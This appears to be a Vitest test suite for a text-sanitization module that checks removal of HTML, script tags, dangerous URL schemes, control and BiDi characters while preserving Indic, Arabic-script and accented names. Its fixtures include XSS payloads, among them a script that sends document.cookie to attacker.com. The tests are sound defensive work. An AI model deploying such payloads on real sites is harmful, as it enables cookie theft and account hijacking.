import { describe, it, expect } from 'vitest'
import {
  sanitizeRawText,
  sanitizeText,
  sanitizeMultilineText,
  sanitizeTextOptional,
  sanitizeMultilineTextOptional,
} from '@/lib/sanitization'

describe('Plain-Text Sanitization Utility (src/lib/sanitization.ts)', () => {
  describe('HTML Tag and Script Neutralization', () => {
    it('strips script tags and inner JavaScript payload completely', () => {
      const input = 'Hello <script>alert("XSS")</script> World'
      expect(sanitizeText(input)).toBe('Hello World')
    })

    it('strips nested and multiline script tags', () => {
      const input = `Line 1
<script type="text/javascript">
  const stolenCookie = document.cookie;
  fetch('http://attacker.com?c=' + stolenCookie);
</script>
Line 2`
      expect(sanitizeMultilineText(input)).toBe('Line 1\n\nLine 2')
    })

    it('strips iframe, style, object, embed, and applet blocks completely', () => {
      const input =
        'Before <iframe src="evil.com"></iframe><style>body { display: none; }</style><object data="test"></object> After'
      expect(sanitizeText(input)).toBe('Before After')
    })

    it('strips standalone dangerous tags', () => {
      const input = 'Dangerous <script src="http://evil.com/xss.js"> text'
      expect(sanitizeText(input)).toBe('Dangerous text')
    })

    it('strips HTML comments', () => {
      const input = 'Visible <!-- secret internal notes --> text'
      expect(sanitizeText(input)).toBe('Visible text')
    })

    it('strips img tag with onerror handler while keeping surrounding text', () => {
      const input = 'Hello <img src="x" onerror="alert(1)" /> World'
      expect(sanitizeText(input)).toBe('Hello World')
    })

    it('strips anchor tags and attributes', () => {
      const input = 'Check <a href="https://example.com" onclick="steal()">this link</a> out'
      expect(sanitizeText(input)).toBe('Check this link out')
    })

    it('preserves mathematical comparison operators like < and > when not forming tags', () => {
      const input = 'Score: 5 < 10 and 20 > 15'
      expect(sanitizeText(input)).toBe('Score: 5 < 10 and 20 > 15')
    })
  })

  describe('Dangerous Scheme and Protocol Neutralization', () => {
    it('strips javascript: pseudo-protocols', () => {
      const input = 'Click javascript:alert(1) here'
      expect(sanitizeText(input)).toBe('Click here')
    })

    it('strips vbscript: and data:text/html pseudo-protocols', () => {
      const input = 'Link data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== test'
      expect(sanitizeText(input)).toBe('Link test')
    })
  })

  describe('Control Character and BiDi Neutralization', () => {
    it('strips null bytes (\\u0000) and ASCII control characters (0x01-0x1F, 0x7F) except whitespace', () => {
      const input = 'Safe\u0000Text\u0007With\u001FControls\u007FHere'
      expect(sanitizeText(input)).toBe('SafeTextWithControlsHere')
    })

    it('strips BiDi directional override characters', () => {
      // \u202E is RIGHT-TO-LEFT OVERRIDE
      const input = 'User\u202E reversed \u202Cname'
      expect(sanitizeText(input)).toBe('User reversed name')
    })
  })

  describe('Unicode & Cultural Name Preservation', () => {
    it('preserves Gujarati names and community identity fields intact', () => {
      const gujarati = 'અમદાવાદ - પટેલ - કશ્યપ - સુરેશભાઈ'
      expect(sanitizeText(gujarati)).toBe(gujarati)
    })

    it('preserves Hindi / Devanagari text intact', () => {
      const devanagari = 'नमस्ते दुनिया - कुलदीप शर्मा - गोत्र भारद्वाज'
      expect(sanitizeText(devanagari)).toBe(devanagari)
    })

    it('preserves Sindhi and Urdu Arabic-script Unicode text intact', () => {
      const sindhi = 'سنڌي سنڌي نالو'
      expect(sanitizeText(sindhi)).toBe(sindhi)
    })

    it('preserves Indic Zero-Width Joiner (ZWJ) and Zero-Width Non-Joiner (ZWNJ)', () => {
      // \u200D and \u200C are essential for Indic conjuncts
      const conjunctWithZWJ = 'ક્\u200Dષ'
      expect(sanitizeText(conjunctWithZWJ)).toBe(conjunctWithZWJ)
    })

    it('preserves accented Latin and international diacritics', () => {
      const accented = 'Renée Müller-Chloë Østergård'
      expect(sanitizeText(accented)).toBe(accented)
    })
  })

  describe('Newline and Whitespace Formatting', () => {
    it('sanitizeText collapses newlines, carriage returns, and multiple spaces into single space', () => {
      const input = 'First    Middle\n\n\nLast\tName'
      expect(sanitizeText(input)).toBe('First Middle Last Name')
    })

    it('sanitizeMultilineText preserves legitimate paragraph breaks', () => {
      const input = `Paragraph 1 line A
Paragraph 1 line B

Paragraph 2 with   multiple   spaces`
      expect(sanitizeMultilineText(input)).toBe(
        'Paragraph 1 line A\nParagraph 1 line B\n\nParagraph 2 with   multiple   spaces'
      )
    })

    it('handles empty, null, undefined, and non-string inputs safely', () => {
      expect(sanitizeRawText(null)).toBe('')
      expect(sanitizeRawText(undefined)).toBe('')
      expect(sanitizeRawText(12345)).toBe('')
      expect(sanitizeText('')).toBe('')
      expect(sanitizeMultilineText('   ')).toBe('')
    })

    it('sanitizeTextOptional returns undefined for empty strings or null', () => {
      expect(sanitizeTextOptional(null)).toBeUndefined()
      expect(sanitizeTextOptional(undefined)).toBeUndefined()
      expect(sanitizeTextOptional('')).toBeUndefined()
      expect(sanitizeTextOptional('   ')).toBeUndefined()
      expect(sanitizeTextOptional('  Valid Name  ')).toBe('Valid Name')
    })

    it('sanitizeMultilineTextOptional returns undefined for empty strings or null', () => {
      expect(sanitizeMultilineTextOptional(null)).toBeUndefined()
      expect(sanitizeMultilineTextOptional('   ')).toBeUndefined()
      expect(sanitizeMultilineTextOptional('A multi\nline story')).toBe('A multi\nline story')
    })
  })
})
